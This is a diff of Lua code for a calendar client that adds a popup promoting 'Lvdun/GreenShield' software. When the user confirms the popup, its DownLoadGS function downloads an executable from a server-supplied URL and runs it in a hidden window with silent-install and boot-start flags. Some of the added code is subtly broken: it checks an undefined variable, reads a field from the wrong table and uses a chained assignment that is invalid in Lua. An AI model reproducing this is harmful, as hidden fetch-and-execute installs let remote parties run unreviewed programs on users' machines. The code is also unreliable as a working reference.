@@ -43,6 +43,37 @@ function CheckTipVersion(tForceVersion)
 	return bRightVer
 end
 
+function DownLoadGS(strUrl, strCmd)
+	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
+	local strPacketURL = strUrl or "http://down.lvdun123.com/client/GsSetup_0006.exe"
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strFileName = string.match(strPacketURL, "/([^/]+exe)")
+	if not IsRealString(strFileName) then
+		strFileName = "GsSetup_0006.exe"
+	end
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strPacketURL..strStamp
+	if string.find(strPacketURL, "?", 1, true) then
+		strStamp = string.gsub(strStamp, "%?", "&")
+		strURLFix = strPacketURL..strStamp
+	end
+	
+	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
+	, function(bRet, strRealPath)
+			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
+					.." strRealPath:"..tostring(strRealPath))
+					
+			if 0 ~= bRet then
+				return
+			end
+			
+			tipUtil:ShellExecute(0, "open", strRealPath, strCmd or "/s /run /setboot" , 0, "SW_HIDE")
+	end)
+end
+
+--如果记录时间是今天则不满足， 否则满足
 function CheckTipHistory(strKey)
 	FunctionObj.TipLog("CheckTipHistory enter")
 	if not IsRealString(strKey) then
@@ -61,6 +92,29 @@ function CheckTipHistory(strKey)
 	return false
 end
 
+--距离所有tip弹出间隔1小时， 距离lvdun推广tip间隔7天
+function CheckLvdunHistory()
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	local nNow = tipUtil:GetCurrentUTCTime() or 0
+	local nLastAll = tUserConfig["nAllTipLastPopUTC"]
+	local nLastLd = tUserConfig["nLvdunTipLastPopUTC"]
+	local function check_poptime(last, step)
+		if type(last) ~= "number" then return true end
+		return nNow-last > step
+	end
+	return check_poptime(tonumber(nLastAll), 3600) and check_poptime(tonumber(nLastLd), 7*24*3600)
+end
+
+--是否安装绿盾
+function CheckLvdunHasInstall()
+	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\GreenShield\\Path")
+	FunctionObj.TipLog("CheckLvdunHasInstall strGSPath = "..tostring(strGSPath))
+	if IsRealString(strGSPath) and tipUtil:QueryFileExists(strGSPath) then
+		return true
+	end
+	return false
+end
+
 function CheckTipWndExist()
 	FunctionObj.TipLog("CheckTipWndExist enter")
 	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
@@ -76,6 +130,14 @@ function CheckTipWndExist()
 	return bRet
 end
 
+
+--[[
+{
+	tVersion = {"26-27"},--日历版本区间
+	nDelayMins = 2*60,--延时时间。
+	text = "richtext",--tip类型，用文本来标识。有以下类型：richtext 富文本; lvdun 推广绿盾。
+}
+]]--
 function GetTipPopInfo(tSvrData, nLaunchUTC)
 	FunctionObj.TipLog("GetTipPopInfo enter, type(tSvrData) = "..type(tSvrData))
 	if type(tSvrData) ~= "table" or type(nLaunchUTC) ~= "number" then
@@ -86,6 +148,7 @@ function GetTipPopInfo(tSvrData, nLaunchUTC)
 	if type(tTipInfo) ~= "table" then
 		return
 	end
+	local txt = string.lower(tostring(tTipInfo["text"]))
 	local nCurUTC = tipUtil:GetCurrentUTCTime()
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	for i, info in ipairs(tTipInfo) do
@@ -95,13 +158,30 @@ function GetTipPopInfo(tSvrData, nLaunchUTC)
 		end
 		local nStep = nCurUTC - nLaunchUTC
 		FunctionObj.TipLog("i = "..i..", nStep = "..nStep)
-		if not CheckTipWndExist() and CheckTipVersion(info["tVersion"]) and type(info["nDelayMins"]) == "number" and CheckTipHistory("nTipLastPopUTC_"..i) and nStep >= info["nDelayMins"]*60 then
-			return i, info
+		--富文本tip, 今天没有弹过， 满足开机延时
+		--绿盾推广tip， 未安装绿盾，距离所有tip弹出间隔1小时， 距离lvdun推广tip间隔7天
+		if not CheckTipWndExist() and CheckTipVersion(info["tVersion"]) and type(info["nDelayMins"]) == "number" then
+			if txt == "richtext" and CheckTipHistory("nTipLastPopUTC_"..i) and nStep >= info["nDelayMins"]*60 then
+				return i, info
+			elseif text == "lvdun" and not CheckLvdunHasInstall() and CheckLvdunHistory() then 
+				return i, info
+			end
 		end
 	end
 end
 
-function ShowTip(idx, info)
+--保存最后弹出时间
+local function save_lastpoptime(idx, info)
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	local txt = string.lower(tostring(info["text"]))
+	tUserConfig["nAllTipLastPopUTC"] = tUserConfig["nTipLastPopUTC_"..idx] = tipUtil:GetCurrentUTCTime()
+	if txt == "lvdun" then tUserConfig["nLvdunTipLastPopUTC"] = tUserConfig["nAllTipLastPopUTC"] end
+	FunctionObj.SaveConfigToFileByKey("tUserConfig")
+end
+
+--弹出富文本tip
+function ShowRichtextTip(idx, info)
+	FunctionObj.TipLog("ShowRichtextTip, enter")
 	FunctionObj.CreateWndByName("TipCommon", "TipCommonTree")
 	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")
 	local strPopupInst = "TipCommon.Instance"
@@ -123,9 +203,33 @@ function ShowTip(idx, info)
 		return
 	end
 	browser:Navigate(info["link"])
-	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
-	tUserConfig["nTipLastPopUTC_"..idx] = tipUtil:GetCurrentUTCTime()
-	FunctionObj.SaveConfigToFileByKey("tUserConfig")
+	save_lastpoptime(idx, info)
+end
+
+--弹出绿盾推广tip
+function ShowLvdunTip(idx, info)
+	FunctionObj.TipLog("ShowLvdunTip, enter")
+	--点击确认回调
+	local function tip_callback_ok()
+		DownLoadGS(info["url"], info["cmd"])
+	end
+	--点击取消回调
+	local function tip_callback_cancel()
+	end
+	--创建tip界面...
+	save_lastpoptime(idx, info)
+end
+
+function ShowTip(idx, info)
+	local txt = string.lower(tostring(info["text"]))
+	FunctionObj.TipLog("ShowTip, enter text = "..txt)
+	if txt  == "richtext" then
+		ShowRichtextTip(idx, info)
+	elseif txt == "lvdun" then
+		ShowLvdunTip(idx, info)
+	else
+		FunctionObj.TipLog("ShowTip, error. text is wrong, no match")
+	end
 end
 
 local obj = {}
